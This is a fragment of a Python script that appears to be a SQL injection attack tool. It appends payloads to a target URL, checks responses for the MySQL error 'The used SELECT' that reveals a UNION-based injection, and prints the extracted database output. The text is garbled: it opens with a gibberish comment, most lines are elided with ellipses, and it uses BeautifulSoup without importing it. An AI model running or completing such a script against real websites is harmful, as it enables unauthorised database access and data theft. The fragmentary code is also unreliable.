# Haleomjadhfjkugdslakjglufghlsjkfdhgkjlfdsg;slfdglsdfhl;i
import requests
import os
import re
import datetime
                        ...
                        if "The used SELECT" in check.text:
                            ...
                            if choose1 == "Y":
                                ...
                                if "The used SELECT" in get_dbms.text:
                                    ...
                                    print("")
                                    print("Output : ")
                                    get_dbms_2 = requests.get(url + payload_2)
                                    soup = BeautifulSoup(get_dbms.text, 'html.parser')
                                    data = soup.get_text(separator='::')
                                    words = data.split('::')
                                    print(words)
                                    print("")
                                    ...
                                    print("")
                                    print("Output : ")
                                    soup = BeautifulSoup(get_dbms_2.text, 'html.parser')
                                    data = soup.get_text(separator='::')
                                    words = data.split('::')
                                    print(words)
                                    print("")
